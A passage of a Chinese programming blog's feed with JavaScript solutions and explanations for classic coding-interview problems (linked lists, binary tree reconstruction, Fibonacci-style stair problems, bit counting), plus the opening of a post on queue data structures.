class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：BUG题/<code>replace()</code></p><blockquote><p>三、从尾到头打印链表 p58</p></blockquote><p><strong>描述</strong>：输入一个链表，按链表值从尾到头的顺序返回一个 <code>ArrayList</code>。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">printListFromTailToHead</span>(<span class="params">head</span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> p = head;</div><div class="line">    <span class="keyword">var</span> result = [];</div><div class="line">    <span class="keyword">while</span>(p)&#123;</div><div class="line">      <span class="comment">// unshift 需要添加到数组开头的元素。</span></div><div class="line">      <span class="comment">// val() 方法返回或设置被选元素的值。</span></div><div class="line">        result.unshift(p.val);</div><div class="line">        <span class="comment">// next() 获得匹配元素集合中每个元素紧邻的同胞元素</span></div><div class="line">        p = p.next;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：BUG题/<code>unshift()</code>在数组的头部添加任意个项并返回新数组的长度</p><p>链表没有先后顺序，就是一个链子</p><blockquote><p>四、 重建二叉树 p62</p></blockquote><p><strong>描述</strong>：输入某二叉树的前序遍历和中序遍历的结果，请重建出该二叉树。假设输入的前序遍历和中序遍历的结果中都不含重复的数字。例如输入前序遍历序列{1,2,4,7,3,5,6,8}和中序遍历序列{4,7,2,1,5,3,8,6}，则重建二叉树并返回。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">reConstructBinaryTree</span>(<span class="params">pre, vin</span>)</span>&#123; <span class="comment">//pre 是前序遍历，vin 是中序遍历</span></div><div class="line">  <span class="comment">// null 是真正的空，[] 里面还有东西</span></div><div class="line">    <span class="keyword">var</span> result =<span class="literal">null</span>;</div><div class="line">    <span class="keyword">if</span>(pre.length&gt;<span class="number">1</span>)&#123;</div><div class="line">      <span class="keyword">var</span> root = pre[<span class="number">0</span>];</div><div class="line">      <span class="comment">// indexOf() 方法可返回某个指定的字符串值首次出现的位置。</span></div><div class="line">      <span class="comment">// 下面开始中序遍历</span></div><div class="line">      <span class="comment">// 找到根节点的位置</span></div><div class="line">      <span class="keyword">var</span> vinRootIndex = vin.indexOf(root);</div><div class="line">      <span class="comment">// 根节点的左边是左子树</span></div><div class="line">      <span class="keyword">var</span> vinLeft = vin.slice(<span class="number">0</span>,vinRootIndex);</div><div class="line">      <span class="comment">// 右边就是右子树</span></div><div class="line">      <span class="keyword">var</span> vinRight = vin.slice(vinRootIndex+<span class="number">1</span>,vin.length);</div><div class="line">      <span class="comment">// 下面开始前序遍历：</span></div><div class="line">      <span class="comment">// shift() 把数组的第一个元素从其中删除，并返回第一个元素的值</span></div><div class="line">      <span class="comment">// 取走第一个数</span></div><div class="line">      pre.shift();</div><div class="line">      <span class="comment">// 此时的第一个数是左子树的第一个数</span></div><div class="line">      <span class="keyword">var</span> preLeft = pre.slice(<span class="number">0</span>,vinLeft.length);</div><div class="line">      <span class="keyword">var</span> preRight = pre.slice(vinLeft.length,pre.length);</div><div class="line">      result=&#123;</div><div class="line">        <span class="attr">val</span>:root,</div><div class="line">        <span class="attr">left</span>:reConstructBinaryTree(preLeft,vinLeft),</div><div class="line">        <span class="attr">right</span>:reConstructBinaryTree(preRight,vinRight)</div><div class="line">      &#125;</div><div class="line"></div><div class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(pre.length ===<span class="number">1</span>)&#123;</div><div class="line">        result= &#123;</div><div class="line">            <span class="attr">val</span> :pre[<span class="number">0</span>],</div><div class="line">            <span class="attr">left</span>:<span class="literal">null</span>,</div><div class="line">            <span class="attr">right</span>:<span class="literal">null</span></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：<br>1、函数里面的参数 <code>pre</code> 是前序遍历，<code>vin</code> 是中序遍历；<br>2、第一步我们进行的是中序遍历：<br>3、前序的第一个点就是根节点，用 <code>indexOf</code> 找到根节点的位置；<br>4、中序遍历中，根节点前面就是左子树，根节点后面就是右子树<br>5、第二步我们开始前序遍历：<br>6、取出根节点！很重要<br>7、用中序遍历中左子树<strong>的长度</strong>，可以知道前序遍历的左子树<br>8、同理可以得到前序遍历的右子树<br>9、第三步就是 <strong>递归</strong><br>10、你不是让我重构这个二叉树吗？OK，我的整体左子树也有小左子树和小右子树啊<br>11、这个时候，“根节点”变了，逻辑却没变，还是用开始的大函数。</p><blockquote><p>五、用两个栈实现队列 p68</p></blockquote><p><strong>描述</strong>：用两个栈来实现一个队列，完成队列的Push和Pop操作。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> strack = [];</div><div class="line"><span class="comment">//push()向数组的末尾添加一个或多个元素，并返回新的长度。</span></div><div class="line"><span class="comment">// 第一步：末尾添加node</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">push</span>(<span class="params">node</span>)</span>&#123;strack.push(node);&#125;</div><div class="line"><span class="comment">// 第二步：取得第一个元素，删除并返回最后一个元素。</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">pop</span>(<span class="params"></span>)</span>&#123;</div><div class="line">  <span class="keyword">if</span>(stack.length == <span class="number">0</span>)</div><div class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">  <span class="keyword">return</span> stack.shift();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：操作两个“先进后出”的栈实现一个“<strong>先进先出</strong>”的队列，所以要用到 <code>shift()</code>来模拟队列</p><blockquote><p>六、旋转数组的最小数字 p82</p></blockquote><p><strong>描述</strong>：把一个数组最开始的若干个元素搬到数组的末尾，我们称之为数组的旋转。 输入一个非减排序的数组的一个旋转，输出旋转数组的最小元素。 例如数组{3,4,5,1,2}为{1,2,3,4,5}的一个旋转，该数组的最小值为1。 NOTE：给出的所有元素都大于0，若数组大小为0，请返回0。<br><figure class="highlight swift"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 用二分查找</span></div><div class="line">function minNumberInRotateArray(arr)&#123;</div><div class="line">  <span class="keyword">let</span> len = arr.length;</div><div class="line">  <span class="keyword">if</span>(len == <span class="number">0</span>)  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"><span class="comment">// 两个指针，最左边和最右边，此时第一个元素应该是大于最后一个元素的（没有重复的元素）。</span></div><div class="line">  <span class="keyword">let</span> <span class="keyword">left</span> = <span class="number">0</span>, <span class="keyword">right</span> = len - <span class="number">1</span>;</div><div class="line">  <span class="keyword">while</span>(<span class="keyword">left</span> &lt; <span class="keyword">right</span>) &#123;</div><div class="line"><span class="comment">//Math.floor() 返回小于或等于一个给定数字的最大整数。</span></div><div class="line">  <span class="keyword">let</span> mid = <span class="keyword">left</span> + <span class="type">Math</span>.floor((<span class="keyword">right</span>-<span class="keyword">left</span>)/<span class="number">2</span>);</div><div class="line"><span class="comment">//中间元素大于最后一个元素，则中间元素位于前面的递增子数组，此时最小元素位于中间元素的后面。我们可以让第一个指针left指向中间元素的后一个元素。</span></div><div class="line">  <span class="keyword">if</span>(arr[mid] &gt; arr[<span class="keyword">right</span>])&#123;</div><div class="line">    <span class="keyword">left</span> = mid + <span class="number">1</span>;</div><div class="line"><span class="comment">// 中间元素位于后面的递增子数组，此时最小元素位于中间元素的前面</span></div><div class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(arr[mid] == arr[<span class="keyword">right</span>])&#123;</div><div class="line">      <span class="keyword">right</span> = <span class="keyword">right</span> - <span class="number">1</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">      <span class="keyword">right</span> = mid;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> arr[<span class="keyword">left</span>];</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：<br>1、这题直接用<code>math.min.apply(null,arr)</code>特没劲儿，时间也是最长的，要用二分查找法<br>2、总结 <code>math.min</code> 是取最小值，但是它是一个一个数字的取，并不能支持数组<br>3、所以 <code>apply</code> 的第一个参数是什么根本不重要，重要的是为了把第二个参数（设置为数组）传进去，找到了最小数，就把他们搬到数组的头部</p><blockquote><p>七、斐波那契数列 p74</p></blockquote><p><strong>描述</strong>：大家都知道斐波那契数列，现在要求输入一个整数n，请你输出斐波那契数列的第n项（从0开始，第0项为0）。<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">function Fibonacci(<span class="keyword">n</span>)&#123;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">n</span>==0)&#123;<span class="keyword">return</span> 0;&#125;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">n</span>==1)&#123;<span class="keyword">return</span> 1;&#125;</div><div class="line">    <span class="keyword">var</span> <span class="keyword">one</span> = 0,<span class="keyword">two</span>=1; <span class="comment">// 这个部分的值是由上面的 return 决定的</span></div><div class="line">    <span class="keyword">var</span> fbnum=1; <span class="comment">// 是0 1 undefined 都可以</span></div><div class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i =2;i&lt;=<span class="keyword">n</span>;i++)&#123;</div><div class="line">        fbnum = <span class="keyword">one</span>+<span class="keyword">two</span>;</div><div class="line">        <span class="keyword">one</span> = <span class="keyword">two</span>; <span class="comment">// 小的数在下一次迭代变成大的数</span></div><div class="line">        <span class="keyword">two</span> = fbnum;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> fbnum;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：套路请熟记</p><blockquote><p>八、跳台阶 p77</p></blockquote><p><strong>描述</strong>：一只青蛙一次可以跳上1级台阶，也可以跳上2级。求该青蛙跳上一个n级的台阶总共有多少种跳法（先后次序不同算不同的结果）。<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">jumpFloor</span>(<span class="params"><span class="built_in">number</span></span>)</span>&#123;</div><div class="line">  <span class="keyword">if</span>(<span class="built_in">number</span> === <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">  <span class="keyword">if</span>(<span class="built_in">number</span> === <span class="number">2</span>) <span class="keyword">return</span> <span class="number">2</span>;</div><div class="line">  <span class="keyword">let</span> next = <span class="number">0</span> ;<span class="comment">// 当前台阶的跳法总数</span></div><div class="line">  <span class="keyword">let</span> one_step = <span class="number">2</span>; <span class="comment">// 当前台阶【后退一阶】的台阶的跳法总数(初始值当前台阶是第3阶)</span></div><div class="line">  <span class="keyword">let</span> two_step = <span class="number">1</span>; <span class="comment">// 当前台阶【后退二阶】的台阶的跳法总数(初始值当前台阶是第3阶)</span></div><div class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">2</span>; i &lt; <span class="built_in">number</span>; i++)&#123; <span class="comment">//(let i = 3; i &lt;= number; i++)</span></div><div class="line">    next = two_step + one_step;<span class="comment">// 小的数在下一次迭代变成大的数</span></div><div class="line">    two_step = one_step;<span class="comment">// 后退一阶在下一次迭代变为后退两阶</span></div><div class="line">    one_step = next; <span class="comment">// 当前台阶在下一次迭代变为后退一阶</span></div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> next;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>或者是：<br><figure class="highlight typescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">jumpFloor</span>(<span class="params"><span class="built_in">number</span></span>)</span>&#123;</div><div class="line">  <span class="keyword">if</span>(<span class="built_in">number</span> === <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">  <span class="keyword">if</span>(<span class="built_in">number</span> === <span class="number">2</span>) <span class="keyword">return</span> <span class="number">2</span>;</div><div class="line">  <span class="keyword">let</span> next = <span class="number">0</span> ;<span class="comment">// 当前台阶的跳法总数</span></div><div class="line">  <span class="keyword">let</span> one_step = <span class="number">1</span>; <span class="comment">// 这个部分的值是由上面的 return 决定的</span></div><div class="line">  <span class="keyword">let</span> two_step = <span class="number">2</span>;  </div><div class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">3</span>; i &lt;= <span class="built_in">number</span>; i++)&#123;</div><div class="line">    next = two_step + one_step;</div><div class="line">    one_step = two_step;<span class="comment">// 小的数在下一次迭代变成大的数</span></div><div class="line">    two_step = next; </div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> next;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：<br>1、其实也是一个斐波那契问题<br>2、第一阶和第二阶考虑过了，初始当前台阶为第三阶，向后迭代<br>3、当前台阶的跳法总数=当前台阶【后退一阶】的台阶的跳法总数+当前台阶【后退二阶】的台阶的跳法总数</p><blockquote><p>九、变态跳台阶 p78</p></blockquote><p><strong>描述</strong>：一只青蛙一次可以跳上1级台阶，也可以跳上2级……它也可以跳上n级。求该青蛙跳上一个n级的台阶总共有多少种跳法。<br><figure class="highlight fortran"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span></span> jumpFloorII(<span class="keyword">number</span>)&#123;</div><div class="line">  <span class="keyword">if</span>(<span class="keyword">number</span> &lt;= <span class="number">1</span>)&#123;</div><div class="line">    <span class="keyword">return</span> <span class="number">1</span> </div><div class="line">  &#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="number">2</span>*jumpFloorII(<span class="keyword">number</span> - <span class="number">1</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：<br>1、因为n级台阶，第一步有n种跳法：跳1级、跳2级、到跳n级<br>2、跳1级，剩下n-1级，则剩下跳法是f(n-1)<br>3、跳2级，剩下n-2级，则剩下跳法是f(n-2)<br>4、所以f(n)=f(n-1)+f(n-2)+…+f(1)<br>5、因为f(n-1)=f(n-2)+f(n-3)+…+f(1)<br>6、所以f(n)+f(n-1) = f(n-1)+2<em>(f(n-2)+f(n-3)+…+f(1))<br>7、所以f(n)=2</em>f(n-1)</p><blockquote><p>十、矩形覆盖 p79</p></blockquote><p><strong>描述</strong>：我们可以用2<em>1的小矩形横着或者竖着去覆盖更大的矩形。请问用n个2</em>1的小矩形无重叠地覆盖一个2*n的大矩形，总共有多少种方法？<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">function rectCover(number)&#123;</div><div class="line">  <span class="keyword">if</span>(number &lt;= 2)&#123;</div><div class="line">    <span class="keyword">return</span> number;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">var</span> <span class="keyword">one</span> = 1;</div><div class="line">  <span class="keyword">var</span> <span class="keyword">two</span> = 2;</div><div class="line">  <span class="keyword">var</span> result = 1;</div><div class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = 3; i &lt;= number; i++)&#123;</div><div class="line">    result = <span class="keyword">one</span> + <span class="keyword">two</span>;</div><div class="line">    <span class="keyword">one</span> = <span class="keyword">two</span>;</div><div class="line">    <span class="keyword">two</span> = result;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>思路</strong>：其实也是一个斐波那契问题</p><blockquote><p>十一、二进制中1的个数 p100</p></blockquote><p><strong>描述</strong>：输入一个整数，输出该数二进制表示中1的个数。其中负数用补码表示。</p><p><strong>方法一：常规解法</strong><br>1、怎样判断一个整数的最右边是不是1<br>2、把整数和1做【位与运算】，看结果是不是0就知道了。<br>3、如果结果是1，那最右边的一位就是1<br>4、bug就是不能分析出来负数，会陷入死循环<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">function NumberOf1(n)&#123;</div><div class="line">  var <span class="built_in">count</span> = <span class="number">0</span>, <span class="built_in">flag</span> = <span class="number">1</span>;</div><div class="line">  <span class="keyword">while</span>(<span class="built_in">flag</span>)&#123;</div><div class="line">    <span class="keyword">if</span>(n&amp;<span class="built_in">flag</span>)<span class="built_in">count</span>++;</div><div class="line">    <span class="built_in">flag</span> = <span class="built_in">flag</span> &lt;&lt; <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">  return <span class="built_in">count</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p><strong>方法二：高级解法</strong><br>1、如果一个整数不为0，那么这个整数至少有一位是1。<br>如果我们把这个整数减1，那么原来处在整数最右边的1就会变为0，原来在1后面的所有的0都会变成1(如果最右边的1后面还有0的话)。<br>其余所有位将不会受到影响。</p><p>2、举个例子：一个二进制数 <code>1100</code>，从右边数起第三位是处于最右边的一个1。减去1后，第三位变成0，它后面的两位0变成了1，而前面的1保持不变，因此得到的结果是 <code>1011</code>.我们发现减1的结果是把最右边的一个1开始的所有位都取反了。这个时候如果我们再把原来的整数和减去1之后的结果做与运算，从原来整数最右边一个1那一位开始所有位都会变成0。如<code>1100&amp;1011=1000</code>.也就是说，把一个整数减去1，再和原整数做与运算，会把该整数最右边一个1变成0.那么一个整数的二进制有多少个1，就可以进行多少次这样的操作。<br><figure class="highlight excel"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">function NumberOf1(<span class="built_in">n</span>)&#123;</div><div class="line">  <span class="built_in">var</span> <span class="built_in">count</span> = <span class="number">0</span>;</div><div class="line">  while (<span class="built_in">n</span>)&#123;</div><div class="line">   <span class="built_in">count</span>++;</div><div class="line">   <span class="built_in">n</span> = (<span class="built_in">n</span>-<span class="number">1</span>)&amp;<span class="built_in">n</span>;//把最右边的一个<span class="number">1</span>变成<span class="number">0</span></div><div class="line">&#125;</div><div class="line">  return <span class="built_in">count</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;【&lt;a href=&quot;https://github.com/wangsiyuan233/NowCoder&quot;&gt;源码地址&lt;/a&gt;】 || 【&lt;a href=&quot;https://www.nowcoder.com/ta/coding-interviews?page=1&quot;&gt;代码调试&lt;/a&gt;】&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;一、 二维数组中的查找 p44&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;描述&lt;/strong&gt;：在一个二维数组中，每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。&lt;br&gt;&lt;figure class=&quot;highlight zephir&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Find&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(target, array)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;span class=&quot;comment&quot;&gt;// column 竖列&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; j = &lt;span class=&quot;keyword&quot;&gt;array&lt;/span&gt;[i].length - &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;; &lt;span class=&quot;comment&quot;&gt;// row 横行&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; (i &amp;lt; &lt;span class=&quot;keyword&quot;&gt;array&lt;/span&gt;.length &amp;amp;&amp;amp; j &amp;gt;= &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;array&lt;/span&gt;[i][j] &amp;lt; target) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      i++;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;array&lt;/span&gt;[i][j] &amp;gt; target)&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      j--;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;true&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;false&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;思路&lt;/strong&gt;：通过对 &lt;code&gt;i&lt;/code&gt; 和 &lt;code&gt;j&lt;/code&gt; 的设置可以得出，最先定位的点是在矩形的左下角，如果某数比目标数小，则向右移动一个单位；如果比目标数大，就向上移动一个单位，直到最后找到这个数（&lt;code&gt;true&lt;/code&gt;），没找到就是 &lt;code&gt;false&lt;/code&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="剑指offer" scheme="wangsiyuan233.github.io/tags/%E5%89%91%E6%8C%87offer/"/>
    
  </entry>
  
  <entry>
    <title>数据结构(3) -- 队列</title>
    <link href="wangsiyuan233.github.io/2018/09/18/76%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-3/"/>
    <id>wangsiyuan233.github.io/2018/09/18/76数据结构-3/</id>
    <published>2018-09-18T02:49:18.000Z</published>
    <updated>2018-09-18T09:35:05.184Z</updated>
    
    <content type="html"><![CDATA[<p>队列一个线性结构，特点是在某一端添加数据，在另一端删除数据，遵循<strong>先进先出</strong>的原则。<br><a id="more"></a><br><img src="https://i.imgur.com/t7QNGSm.png" alt=""></p><blockquote><p>一、 单链队列 </p></blockquote><p>因为单链队列在出队操作的时候需要 O(n) 的时间复杂度，所以引入了循环队列。循环队列的出队操作平均是 O(1) 的时间复杂度。<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Queue</span> </span>&#123;</div><div class="line">  <span class="keyword">constructor</span>() &#123;</div><div class="line">    <span class="keyword">this</span>.queue = []</div><div class="line">  &#125;</div><div class="line">  enQueue(item) &#123;</div><div class="line">    <span class="keyword">this</span>.queue.push(item)</div><div class="line">  &#125;</div><div class="line">  deQueue() &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.queue.shift()</div><div class="line">  &#125;</div><div class="line">  getHeader() &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.queue[<span class="number">0</span>]</div><div class="line">  &#125;</div><div class="line">  getLength() &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.queue.length</div><div class="line">  &#125;</div><div class="line">  isEmpty() &#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getLength() === <span class="number">0</span></div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><blockquote><p>二、循环队列</p></blockquote><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">SqQueue</span> </span>&#123;</div><div class="line">  <span class="keyword">constructor</span>(length) &#123;</div><div class="line">    <span class="keyword">this</span>.queue = new Array(length + <span class="number">1</span>)</div><div class="line">    <span class="comment">// 